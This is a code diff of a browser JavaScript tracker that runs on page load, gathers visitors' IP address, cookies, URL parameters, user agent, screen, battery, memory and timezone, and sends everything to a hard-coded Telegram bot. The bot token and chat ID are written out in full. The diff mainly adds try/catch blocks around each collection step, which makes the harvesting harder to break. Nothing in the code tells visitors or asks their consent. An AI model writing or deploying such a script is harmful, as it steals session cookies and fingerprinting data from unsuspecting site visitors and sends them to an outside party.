@@ -4,58 +4,115 @@ let DataOnUser = [];
 // Function to collect data
 async function collectData() {
   try {
-    // Get IP Data
+    console.log("Fetching IP data...");
     const ipResponse = await fetch("http://ip-api.com/line/?fields=query");
     if (!ipResponse.ok) {
       const text = await ipResponse.text();
       throw new Error(`Network response was not ok: ${ipResponse.status} ${text}`);
     }
-    const ipData = await ipResponse.text();
-    if (!ipData) {
-      throw new Error("No IP address returned");
+
+    try {
+      const ipData = await ipResponse.text();
+      if (!ipData) {
+        throw new Error("No IP address returned");
+      }
+      DataOnUser.push("IP Data: " + ipData); // IP address string
+      console.log("IP Data: " + ipData); // Log the IP address
+    } catch (error) {
+      console.error("Error processing IP data:", error.message);
     }
-    DataOnUser.push("IP Data: " + ipData); // IP address string
-    console.log("IP Data: " + ipData); // Log the IP address
 
     // Get other user data
-    let language = navigator.language;
-    DataOnUser.push("Language: " + language);
+    try {
+      let language = navigator.language;
+      DataOnUser.push("Language: " + language);
+    } catch (error) {
+      console.error("Error fetching language:", error.message);
+    }
 
-    let languageList = navigator.languages.join(", ");
-    DataOnUser.push("Preferred Languages List: " + languageList);
+    try {
+      let languageList = navigator.languages.join(", ");
+      DataOnUser.push("Preferred Languages List: " + languageList);
+    } catch (error) {
+      console.error("Error fetching preferred languages:", error.message);
+    }
 
-    let os = navigator.appVersion;
-    DataOnUser.push("Operating System: " + os);
+    try {
+      let os = navigator.appVersion;
+      DataOnUser.push("Operating System: " + os);
+    } catch (error) {
+      console.error("Error fetching operating system:", error.message);
+    }
 
-    let referrer = document.referrer || "No Referrer";
-    DataOnUser.push("Referring Website: " + referrer);
+    try {
+      let referrer = document.referrer || "No Referrer";
+      DataOnUser.push("Referring Website: " + referrer);
+    } catch (error) {
+      console.error("Error fetching referrer:", error.message);
+    }
 
-    let time = new Date();
-    DataOnUser.push("Visit Time: " + time);
+    try {
+      let time = new Date();
+      DataOnUser.push("Visit Time: " + time);
+    } catch (error) {
+      console.error("Error fetching visit time:", error.message);
+    }
 
-    let screenResolution = `${screen.width}x${screen.height}`;
-    DataOnUser.push("Screen Resolution: " + screenResolution);
+    try {
+      let screenResolution = `${screen.width}x${screen.height}`;
+      DataOnUser.push("Screen Resolution: " + screenResolution);
+    } catch (error) {
+      console.error("Error fetching screen resolution:", error.message);
+    }
 
-    let cookiesBool = navigator.cookieEnabled;
-    DataOnUser.push("Cookies Enabled?: " + cookiesBool);
+    try {
+      let cookiesBool = navigator.cookieEnabled;
+      DataOnUser.push("Cookies Enabled?: " + cookiesBool);
+    } catch (error) {
+      console.error("Error checking cookies:", error.message);
+    }
 
-    let cookies = document.cookie || "No Cookies";
-    DataOnUser.push("Cookies: " + cookies);
+    try {
+      let cookies = document.cookie || "No Cookies";
+      DataOnUser.push("Cookies: " + cookies);
+    } catch (error) {
+      console.error("Error fetching cookies:", error.message);
+    }
 
-    let method = "GET";
-    DataOnUser.push("Method: " + method);
+    try {
+      let method = "GET";
+      DataOnUser.push("Method: " + method);
+    } catch (error) {
+      console.error("Error setting request method:", error.message);
+    }
 
-    let path = window.location.pathname;
-    DataOnUser.push("Request Path: " + path);
+    try {
+      let path = window.location.pathname;
+      DataOnUser.push("Request Path: " + path);
+    } catch (error) {
+      console.error("Error fetching request path:", error.message);
+    }
 
-    let parameters = window.location.search || "No Parameters";
-    DataOnUser.push("Request Parameters: " + parameters);
+    try {
+      let parameters = window.location.search || "No Parameters";
+      DataOnUser.push("Request Parameters: " + parameters);
+    } catch (error) {
+      console.error("Error fetching request parameters:", error.message);
+    }
 
-    let userAgent = navigator.userAgent;
-    DataOnUser.push("User Agent: " + userAgent);
+    try {
+      let userAgent = navigator.userAgent;
+      DataOnUser.push("User Agent: " + userAgent);
+    } catch (error) {
+      console.error("Error fetching user agent:", error.message);
+    }
 
-    let deviceType = /mobile/i.test(userAgent) ? "Mobile" : "Desktop";
-    DataOnUser.push("Device Type: " + deviceType);
+    try {
+      let deviceType = /mobile/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
+      DataOnUser.push("Device Type: " + deviceType);
+    } catch (error) {
+      console.error("Error determining device type:", error.message);
+    }
 
     // Get battery level
     try {
@@ -68,33 +125,46 @@ async function collectData() {
       }
     } catch (error) {
       DataOnUser.push("Battery Level: Error fetching battery level");
+      console.error("Error fetching battery level:", error.message);
     }
 
     // Get device memory information
-    if (navigator.deviceMemory) {
-      let memory = navigator.deviceMemory;
-      DataOnUser.push("Device Memory: " + memory + "GB");
-    } else {
-      DataOnUser.push("Device Memory: Not available in this browser.");
+    try {
+      if (navigator.deviceMemory) {
+        let memory = navigator.deviceMemory;
+        DataOnUser.push("Device Memory: " + memory + "GB");
+      } else {
+        DataOnUser.push("Device Memory: Not available in this browser.");
+      }
+    } catch (error) {
+      console.error("Error fetching device memory:", error.message);
     }
 
     // Get timezone
-    let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    DataOnUser.push("Timezone: " + timezone);
+    try {
+      let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      DataOnUser.push("Timezone: " + timezone);
+    } catch (error) {
+      console.error("Error fetching timezone:", error.message);
+    }
 
     // Get online/offline status
-    let onlineStatus = window.navigator.onLine ? "Online" : "Offline";
-    DataOnUser.push("Online Status: " + onlineStatus);
+    try {
+      let onlineStatus = window.navigator.onLine ? "Online" : "Offline";
+      DataOnUser.push("Online Status: " + onlineStatus);
+    } catch (error) {
+      console.error("Error fetching online status:", error.message);
+    }
 
   } catch (error) {
-    console.error("Error collecting data:", error);
+    console.error("Error collecting data:", error.message);
     throw error; // Re-throw to handle in the caller
   }
 }
-// Send collected data to Telegram
-// Send collected data to Telegram
+
 // Send collected data to Telegram
 function sendToTelegram(data) {
+  try {
     const token = "6864161221:AAG-QIHhP-ecZxcKsB_PaY9yaAlW7rRBw9M"; // Your bot token
     const chatId = "6107520820"; // Your chat ID
 
@@ -104,27 +174,31 @@ function sendToTelegram(data) {
     const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
     fetch(url)
-        .then(response => response.json())
-        .then(data => {
-            if (data.ok) {
-                console.log('Data sent successfully');
-            } else {
-                console.error('Error sending data: ' + data.description);
-            }
-        })
-        .catch(error => {
-            console.error('Error:', error);
-        });
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          console.log('Data sent successfully');
+        } else {
+          console.error('Error sending data: ' + data.description);
+        }
+      })
+      .catch(error => {
+        console.error('Error sending data:', error);
+      });
+  } catch (error) {
+    console.error("Error in sendToTelegram:", error.message);
+  }
 }
+
 // Execute on page load
 window.onload = async function() {
   try {
     await collectData(); // Collect all user data first
     sendToTelegram(DataOnUser); // Then send data to Telegram
   } catch (error) {
-    console.error("Error collecting data:", error);
+    console.error("Error executing on page load:", error.message);
   }
 };
 
-// Printing data
+// Printing data to the console
 console.log(DataOnUser);
